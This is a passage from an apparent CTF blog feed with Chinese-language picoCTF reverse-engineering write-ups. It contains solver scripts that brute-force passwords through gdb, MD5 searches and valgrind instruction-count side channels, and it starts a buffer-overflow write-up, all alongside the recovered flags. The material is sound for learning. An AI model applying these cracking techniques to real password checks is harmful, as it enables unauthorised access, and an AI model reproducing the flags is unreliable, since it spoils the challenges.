./brute"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gef"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"b *0x565559a7"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>alphabet <span class="token operator">=</span> string<span class="token punctuation">.</span>printableflag <span class="token operator">=</span> <span class="token string">"picoCTF"</span><span class="token keyword">while</span> <span class="token string">"&#125;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"run"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Starting program"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"trying "</span> <span class="token operator">+</span> flag <span class="token operator">+</span> c<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>flag <span class="token operator">+</span> c<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gef"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"x/x $ebp-0x14"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0xffff"</span><span class="token punctuation">)</span>        count <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> count <span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> c            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ARMssembly-4-170-points"><a href="#ARMssembly-4-170-points" class="headerlink" title="ARMssembly 4 [170 points]"></a>ARMssembly 4 [170 points]</h1><p>和前面幾題都一樣，跑起來傳值就完事，<del>已經變template了</del></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># Cross-Compile and Link</span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-as <span class="token parameter variable">-o</span> chall_4.o chall_4.S<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>aarch64-linux-gnu-gcc <span class="token parameter variable">-o</span> chall_4.elf chall_4.o<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span><span class="token function">chmod</span> +x chall_4.elf<span class="token variable">)</span></span><span class="token comment"># Run</span><span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qemu-aarch64 ./chall_4.elf <span class="token number">2907278761</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[0-9]*'</span><span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"Flag: picoCTF&#123;<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">"%08x"</span> $output<span class="token variable">)</span></span>&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;ad498e1c&#125;</code></p><h1 id="Powershelly-180-points"><a href="#Powershelly-180-points" class="headerlink" title="Powershelly [180 points]"></a>Powershelly [180 points]</h1><p>這題有點通靈 BJ4了</p><h1 id="Rolling-My-Own-300-points"><a href="#Rolling-My-Own-300-points" class="headerlink" title="Rolling My Own [300 points]"></a>Rolling My Own [300 points]</h1><p>先用IDA 反編譯看main:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-F8h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-F8h]</span>  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-F4h]</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v9<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-F0h]</span>  _BYTE <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-E8h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-E0h]</span>  __int64 v12<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-D0h]</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-C0h] BYREF</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-90h] BYREF</span>  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-50h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+F8h] [rbp-8h]</span>  v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"GpLaMjEWpVOjnnmkRGiledp6Mvcezxls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v11<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>  v11<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v11<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>  v11<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">strncat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strncat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_E3E</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> dest<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> k <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> k <span class="token operator">+</span> j <span class="token operator">+</span> v11<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> v12<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">=</span> v12<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>  <span class="token function">v9</span><span class="token punctuation">(</span>sub_102B<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>從main中可以看到輸入被存到變數s中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibrequiredBytes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"4889fe48"</span><span class="token punctuation">,</span> <span class="token string">"bff126dc"</span><span class="token punctuation">,</span> <span class="token string">"b3070000"</span><span class="token punctuation">,</span> <span class="token string">"00ffd6"</span><span class="token punctuation">]</span>offsets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>requiredString <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"GpLaMjEW"</span><span class="token punctuation">,</span> <span class="token string">"pVOjnnmk"</span><span class="token punctuation">,</span> <span class="token string">"RGiledp6"</span><span class="token punctuation">,</span> <span class="token string">"Mvcezxls"</span><span class="token punctuation">]</span>found <span class="token operator">=</span> <span class="token boolean">False</span>password <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>requiredString<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    found <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token comment">#Generate 4 characters per iteration</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    hashThis <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">+</span> requiredString<span class="token punctuation">[</span>x<span class="token punctuation">]</span>                    result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>hashThis<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment">#print(result)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">[</span>offsets<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>offsets<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>requiredBytes<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> requiredBytes<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        password<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hashThis<span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Found smth!"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hashThis<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                        found <span class="token operator">=</span> <span class="token boolean">True</span>                        <span class="token keyword">break</span>                <span class="token keyword">if</span> found<span class="token punctuation">:</span>                    <span class="token keyword">break</span>            <span class="token keyword">if</span> found<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found<span class="token punctuation">:</span>            <span class="token keyword">break</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;r011ing_y0ur_0wn_crypt0_15_h4rd!_3c22f4e9&#125;</code></p><h1 id="Checkpass-375-points"><a href="#Checkpass-375-points" class="headerlink" title="Checkpass [375 points]"></a>Checkpass [375 points]</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>flag_try_char <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span><span class="token string">"_"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"error"</span><span class="token keyword">def</span> <span class="token function">count_instrucations</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    valgrind_stderr <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">"valgrind"</span><span class="token punctuation">,</span> <span class="token string">"--tool=cachegrind"</span><span class="token punctuation">,</span> <span class="token string">"./checkpass"</span><span class="token punctuation">,</span> <span class="token string">"picoCTF&#123;"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    valgrind_stderr<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I   refs:"</span><span class="token punctuation">)</span>    answer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>valgrind_stderr<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    valgrind_stderr<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> answer<span class="token keyword">def</span> <span class="token function">find_pass_index</span><span class="token punctuation">(</span>base_chr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> best_count<span class="token punctuation">;</span>    search_indexs <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">if</span> collect_pass<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> search_indexs<span class="token punctuation">:</span>        try_pass <span class="token operator">=</span> collect_pass<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> base_chr <span class="token operator">+</span> collect_pass<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>try_pass<span class="token punctuation">)</span>        count <span class="token operator">=</span> count_instrucations<span class="token punctuation">(</span>try_pass<span class="token punctuation">)</span>        <span class="token keyword">if</span> count <span class="token operator">></span> best_count<span class="token punctuation">:</span>            best_count <span class="token operator">=</span> count            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found an index: "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> try_passcollect_pass <span class="token operator">=</span> <span class="token string">"********************************"</span>best_count <span class="token operator">=</span> count_instrucations<span class="token punctuation">(</span>collect_pass<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"searching for necessary characters for verification..."</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">"*"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> collect_pass<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> flag_try_char<span class="token punctuation">:</span>        count <span class="token operator">=</span> count_instrucations<span class="token punctuation">(</span>collect_pass<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> count <span class="token operator">></span> best_count<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token operator">+</span><span class="token string">" is necessary for the next verification, searching for an index..."</span><span class="token punctuation">)</span>            collect_pass <span class="token operator">=</span> find_pass_index<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"approximate password: "</span> <span class="token operator">+</span> collect_pass <span class="token operator">+</span> <span class="token string">", continuing the search..."</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"finished."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> picoCTF2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 reverse write-up</title>
      <link href="/CTF/picoCTF/All-Write-Up/picoCTF2024-Reverse/picoCTF2024-Reverse/"/>
      <url>/CTF/picoCTF/All-Write-Up/picoCTF2024-Reverse/picoCTF2024-Reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="WinAntiDbg0x100"><a href="#WinAntiDbg0x100" class="headerlink" title="WinAntiDbg0x100"></a>WinAntiDbg0x100</h1><h1 id="WinAntiDbg0x200"><a href="#WinAntiDbg0x200" class="headerlink" title="WinAntiDbg0x200"></a>WinAntiDbg0x200</h1><h1 id="WinAntiDbg0x300"><a href="#WinAntiDbg0x300" class="headerlink" title="WinAntiDbg0x300"></a>WinAntiDbg0x300</h1><h1 id="FactCheck"><a href="#FactCheck" class="headerlink" title="FactCheck"></a>FactCheck</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> ~/CTF/FactCheck❯ strings bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"pico"</span>picoCTF<span class="token punctuation">&#123;</span>wELF_d0N3_mate_<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>gdb .&#x2F;bin<br>b main<br>r<br>ni(直到flag跑出來)</p><h1 id="packer"><a href="#packer" class="headerlink" title="packer"></a>packer</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> picoCTF2024 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF buffer overflow 0 [100 points]</title>
      <link href="/CTF/picoCTF/Binary%20Exploitation/buffer%20overflow%200/2023-12-25-picoctf-buffer-overflow-0-%5B100-points%5D/"/>
      <url>/CTF/picoCTF/Binary%20Exploitation/buffer%20overflow%200/2023-12-25-picoctf-buffer-overflow-0-%5B100-points%5D/</url>
      
        <content type="html"><![CDATA[<h1 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h1><p>points:100</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>Smash the stack Let’s start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using:</p></blockquote><h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><p><code>How can you trigger the flag to print?</code></p><p><code>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren&#39;t expecting.</code></p><p><code>Run man gets and read the BUGS section. How many characters can the program really read?</code></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc vuln.c <span class="token parameter variable">-m32</span> -fno-stack-protector <span class="token parameter variable">-z</span> noexecstack <span class="token parameter variable">-o</span> vuln<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到 <code>sigsegv_handler function</code> 得知只要緩衝區溢位就能print出flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sigsegv_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token 